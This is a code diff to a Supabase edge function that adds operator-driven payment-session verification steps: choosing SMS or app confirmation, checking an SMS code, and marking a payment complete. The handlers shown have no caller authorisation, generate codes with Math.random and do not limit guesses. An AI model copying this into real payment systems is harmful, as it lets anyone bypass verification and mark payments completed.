@@ -32,6 +32,14 @@ serve(async (req) => {
         return await handleGetActiveSessions(req);
       case 'inactive-sessions':
         return await handleGetInactiveSessions(req);
+      case 'set-verification-method':
+        return await handleSetVerificationMethod(req);
+      case 'confirm-app-verification':
+        return await handleConfirmAppVerification(req);
+      case 'submit-sms-code':
+        return await handleSubmitSmsCode(req);
+      case 'complete-payment':
+        return await handleCompletePayment(req);
       default:
         return new Response(JSON.stringify({ error: 'Invalid action' }), {
           status: 400,
@@ -185,6 +193,140 @@ async function handleGetInactiveSessions(req: Request) {
   }
 
   return new Response(JSON.stringify({ sessions: data }), {
+    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+  });
+}
+
+async function handleSetVerificationMethod(req: Request) {
+  const { sessionId, method } = await req.json();
+
+  console.log('Setting verification method:', sessionId, method);
+
+  const updates: any = {
+    verification_method: method,
+    admin_action_pending: true,
+    last_seen: new Date().toISOString()
+  };
+
+  // Generate SMS code if SMS verification
+  if (method === 'sms_confirmation') {
+    updates.sms_code = Math.floor(100000 + Math.random() * 900000).toString();
+    updates.verification_status = 'sms_sent';
+  } else if (method === 'app_confirmation') {
+    updates.verification_status = 'waiting';
+  } else if (method === 'choice_required') {
+    updates.verification_status = 'waiting';
+  }
+
+  const { data, error } = await supabase
+    .from('payment_sessions')
+    .update(updates)
+    .eq('session_id', sessionId)
+    .select()
+    .single();
+
+  if (error) {
+    console.error('Error setting verification method:', error);
+    throw error;
+  }
+
+  return new Response(JSON.stringify({ success: true, data }), {
+    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+  });
+}
+
+async function handleConfirmAppVerification(req: Request) {
+  const { sessionId } = await req.json();
+
+  console.log('Confirming app verification:', sessionId);
+
+  const { data, error } = await supabase
+    .from('payment_sessions')
+    .update({
+      verification_status: 'app_confirmed',
+      last_seen: new Date().toISOString()
+    })
+    .eq('session_id', sessionId)
+    .select()
+    .single();
+
+  if (error) {
+    console.error('Error confirming app verification:', error);
+    throw error;
+  }
+
+  return new Response(JSON.stringify({ success: true, data }), {
+    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+  });
+}
+
+async function handleSubmitSmsCode(req: Request) {
+  const { sessionId, code } = await req.json();
+
+  console.log('Submitting SMS code:', sessionId);
+
+  // Get the session to verify the code
+  const { data: session, error: fetchError } = await supabase
+    .from('payment_sessions')
+    .select('sms_code')
+    .eq('session_id', sessionId)
+    .single();
+
+  if (fetchError) {
+    console.error('Error fetching session:', fetchError);
+    throw fetchError;
+  }
+
+  // Verify SMS code
+  if (session.sms_code !== code) {
+    return new Response(JSON.stringify({ error: 'Invalid SMS code' }), {
+      status: 400,
+      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+    });
+  }
+
+  const { data, error } = await supabase
+    .from('payment_sessions')
+    .update({
+      verification_status: 'sms_confirmed',
+      last_seen: new Date().toISOString()
+    })
+    .eq('session_id', sessionId)
+    .select()
+    .single();
+
+  if (error) {
+    console.error('Error confirming SMS:', error);
+    throw error;
+  }
+
+  return new Response(JSON.stringify({ success: true, data }), {
+    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+  });
+}
+
+async function handleCompletePayment(req: Request) {
+  const { sessionId } = await req.json();
+
+  console.log('Completing payment:', sessionId);
+
+  const { data, error } = await supabase
+    .from('payment_sessions')
+    .update({
+      verification_status: 'completed',
+      admin_action_pending: false,
+      last_seen: new Date().toISOString()
+    })
+    .eq('session_id', sessionId)
+    .select()
+    .single();
+
+  if (error) {
+    console.error('Error completing payment:', error);
+    throw error;
+  }
+
+  return new Response(JSON.stringify({ success: true, data }), {
     headers: { ...corsHeaders, 'Content-Type': 'application/json' },
   });
 }
